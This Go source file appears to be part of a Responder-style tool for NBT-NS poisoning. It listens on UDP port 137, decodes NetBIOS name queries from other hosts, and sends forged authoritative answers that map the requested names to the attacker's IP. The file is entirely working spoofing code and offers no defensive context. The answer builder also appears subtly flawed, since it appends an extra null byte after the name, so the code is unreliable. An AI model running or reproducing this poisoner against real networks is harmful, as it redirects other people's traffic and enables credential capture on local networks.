package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"strings"
)

const nbtnsPort = 137

func poisonNBTNS(ifaceIP net.IP) {
	conn, err := net.ListenPacket("udp4", fmt.Sprintf("0.0.0.0:%d", nbtnsPort))
	if err != nil {
		logError("NBT-NS listen :%d — %v (need root?)", nbtnsPort, err)
		return
	}
	defer conn.Close()

	logInfo("NBT-NS listening on %s (UDP %d)", ifaceIP, nbtnsPort)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFrom(buf)
		if err != nil {
			continue
		}
		pkt := buf[:n]
		name := parseNBTNSQuery(pkt)
		if name == "" {
			continue
		}
		logVerbose("NBT-NS query: '%s' from %s", name, src)
		if analyzeMode {
			logInfo("[NBT-NS] [Analyze] query for '%s' from %s", name, src)
			continue
		}
		if !shouldRespond(src, name) {
			logVerbose("NBT-NS skipping '%s' from %s (filter)", name, src)
			continue
		}
		resp := buildNBTNSResponse(pkt, ifaceIP)
		if resp != nil {
			conn.WriteTo(resp, src)
			logInfo("[NBT-NS] Poisoned query for '%s' — responding with %s", name, ifaceIP)
		}
	}
}

// parseNBTNSQuery parses a NetBIOS Name Service query and decodes the requested name.
func parseNBTNSQuery(pkt []byte) string {
	if len(pkt) < 12 {
		return ""
	}
	flags := binary.BigEndian.Uint16(pkt[2:4])
	if flags&0x8000 != 0 { // response bit set
		return ""
	}
	qdCount := binary.BigEndian.Uint16(pkt[4:6])
	if qdCount == 0 {
		return ""
	}
	// Question name starts at offset 12
	// NBT name is a 32-character second-level encoded label
	if len(pkt) < 12+1 {
		return ""
	}
	labelLen := int(pkt[12])
	if labelLen != 32 || len(pkt) < 12+1+32 {
		return ""
	}
	encoded := pkt[13 : 13+32]
	return decodeNBTName(encoded)
}

// decodeNBTName decodes a 32-byte NBT second-level encoded name.
// Each pair of bytes encodes one character: ((A-'A')<<4)|(B-'A')
func decodeNBTName(encoded []byte) string {
	if len(encoded) != 32 {
		return ""
	}
	var b strings.Builder
	for i := 0; i < 32; i += 2 {
		hi := encoded[i] - 'A'
		lo := encoded[i+1] - 'A'
		c := (hi << 4) | lo
		if c != 0x20 && c != 0x00 { // skip padding spaces and null suffix byte
			b.WriteByte(c)
		}
	}
	return strings.TrimSpace(b.String())
}

// encodeNBTName encodes a NetBIOS name (up to 15 chars) to 32-byte wire format.
func encodeNBTName(name string, suffix byte) []byte {
	padded := make([]byte, 16)
	copy(padded, []byte(strings.ToUpper(name)))
	for i := len(name); i < 15; i++ {
		padded[i] = 0x20
	}
	padded[15] = suffix

	out := make([]byte, 32)
	for i, c := range padded {
		out[i*2] = 'A' + (c >> 4)
		out[i*2+1] = 'A' + (c & 0x0F)
	}
	return out
}

// buildNBTNSResponse constructs a NBNS Name Query Response pointing to our IP.
func buildNBTNSResponse(query []byte, ip net.IP) []byte {
	if len(query) < 12 {
		return nil
	}
	txID := binary.BigEndian.Uint16(query[0:2])

	// Parse the question name so we can echo it back
	if len(query) < 13 {
		return nil
	}
	labelLen := int(query[12])
	if labelLen != 32 || len(query) < 13+32+4 {
		return nil
	}
	encodedName := query[12 : 13+32+1] // length byte + 32 bytes + null terminator

	var resp []byte
	// Transaction ID
	resp = append(resp, byte(txID>>8), byte(txID))
	// Flags: Response, Authoritative, Recursion Available
	resp = append(resp, 0x85, 0x00)
	// QDCOUNT=0, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, 0x00, 0x00)

	// Answer record: Name
	resp = append(resp, encodedName...)
	resp = append(resp, 0x00) // null terminator for the name

	// Type NB (0x0020), Class IN (0x0001)
	resp = append(resp, 0x00, 0x20)
	resp = append(resp, 0x00, 0x01)
	// TTL 30s
	resp = append(resp, 0x00, 0x00, 0x00, 0x1E)
	// RDLENGTH: 6 (2 name flags + 4 IP)
	resp = append(resp, 0x00, 0x06)
	// NB Flags: B-node, unique
	resp = append(resp, 0x00, 0x00)
	// IP address
	resp = append(resp, ip.To4()...)

	return resp
}
